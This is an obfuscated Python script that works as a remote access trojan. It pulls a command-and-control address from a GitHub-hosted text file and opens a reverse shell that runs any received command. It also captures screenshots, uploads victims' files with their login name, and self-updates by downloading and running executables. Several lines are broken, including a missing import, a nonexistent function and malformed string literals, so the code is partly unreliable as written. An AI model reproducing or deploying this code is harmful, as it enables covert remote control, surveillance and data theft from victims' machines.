import sys,subprocess,socket,time,requests
from PIL import ImageGrab
cxPPXVBXbkElYkb = "04.12.24.7"
INMYKPgWnHImoL = ""
CQrPyIsMGUyouDSDp = ""
FBUkzKbN = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
vFFVtnOe = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
MlitsDEOZdipVZyvhdBXm = "!"
def qaMZeuEmXxNtHdDTvIUpCa(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def bDaSbdHmHErjeJppZV(s):
	DWhAWsbr = s.recv(1024)
	if len(DWhAWsbr)==0:
		return True
	gTejgvjnuTunXq = DWhAWsbr.decode("utf-8")
	if not gTejgvjnuTunXq.startswith(MlitsDEOZdipVZyvhdBXm):
		proc = subprocess.run(DWhAWsbr.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	kMogUsspAEHviaVPNySFLSM = gTejgvjnuTunXq.split(" ")[0][1:]
	if kMogUsspAEHviaVPNySFLSM == "download":
		nKzslklpyPldbPPrzV(s, gTejgvjnuTunXq)
	elif kMogUsspAEHviaVPNySFLSM == "screenshot":
		WFyfgLbNtbsBg(s)
	elif kMogUsspAEHviaVPNySFLSM == "fpiEoieS":
		s.send(bytes(cxPPXVBXbkElYkb, "utf-8"))
def nKzslklpyPldbPPrzV(s, gTejgvjnuTunXq):
	OTyXIyXegHZ = gTejgvjnuTunXq.replace(MlitsDEOZdipVZyvhdBXm+"screenshot ", "").split(",")
	results = []
	for f in OTyXIyXegHZ:
		results += GYbxcitWWMVJCsCmeLaWOw(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
def WFyfgLbNtbsBg(gTejgvjnuTunXq):
	gddPeiBilVlbbNpO = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	gddPeiBilVlbbNpO.save(fpath)
	gddPeiBilVlbbNpO.close()
	r = GYbxcitWWMVJCsCmeLaWOw(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def GYbxcitWWMVJCsCmeLaWOw(jfkOvGvODvxCcMszVbwukMQ, JosQxLybPqwxMWm, rFJhpMaDnh=None):
	if not os.path.exists(jfkOvGvODvxCcMszVbwukMQ):
		return "FILE NOT FOUND: "+jfkOvGvODvxCcMszVbwukMQ
	headers = {"user":os.getlogin()}
	if rFJhpMaDnh is not None:
		headers = {**headers, **rFJhpMaDnh}
	requests.post(INMYKPgWnHImoL+":"+CQrPyIsMGUyouDSDp+"/"+JosQxLybPqwxMWm,
		files={open(jfkOvGvODvxCcMszVbwukMQ, "rb")},
		headers=headers)
	return "SUCCESS"
def QbNoFYQ():
	if INMYKPgWnHImoL == "" or CQrPyIsMGUyouDSDp == "":
		DWhAWsbr = requests.get(FBUkzKbN).text.replace("\n","").split(":")
		INMYKPgWnHImoL = DWhAWsbr[0].strip()
		CQrPyIsMGUyouDSDp = DWhAWsbr[1].strip()
		fpiEoieS = DWhAWsbr[2].strip()
	return INMYKPgWnHImoL, CQrPyIsMGUyouDSDp, fpiEoieS
def BlArIYivviZzUhkqYP():
	sGQLjDoaxwhmI = os.path.basename(__file__)
	fileType = sGQLjDoaxwhmI.split(".")[-1]
	mdqIsxvfDXNfauyNevRxq = sGQLjDoaxwhmI.replace(fileType,"") +"."+cxPPXVBXbkElYkb + fileType
	zGTANCHaOCLPvsTGWVFMD = os.path.join(os.path.getcwd(), mdqIsxvfDXNfauyNevRxq)
	with open(mdqIsxvfDXNfauyNevRxq, "wb+") as f:
		f.write(requests.get(vFFVtnOe+"/file"+zGTANCHaOCLPvsTGWVFMD.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+zGTANCHaOCLPvsTGWVFMD)
	elif fileType == ".pyw":
		os.system("python "+zGTANCHaOCLPvsTGWVFMD")
def viBKZEsdFhdpASaRzuIXP():
	pass
def djtNnPzLrFpQ():
	h, p, v = QbNoFYQ()
	if cxPPXVBXbkElYkb != v:
		BlArIYivviZzUhkqYP()
	viBKZEsdFhdpASaRzuIXP()
	VSYkIKhSWjgPYdAdL = bytes("["+cxPPXVBXbkElYkb+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				vcZdKKIcSMfdGzFTEeG=False
				try:
					s=qaMZeuEmXxNtHdDTvIUpCa(h, p)
					while not vcZdKKIcSMfdGzFTEeG:
						s.send(VSYkIKhSWjgPYdAdL)
						vcZdKKIcSMfdGzFTEeG=bDaSbdHmHErjeJppZV(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(djtNnPzLrFpQ())
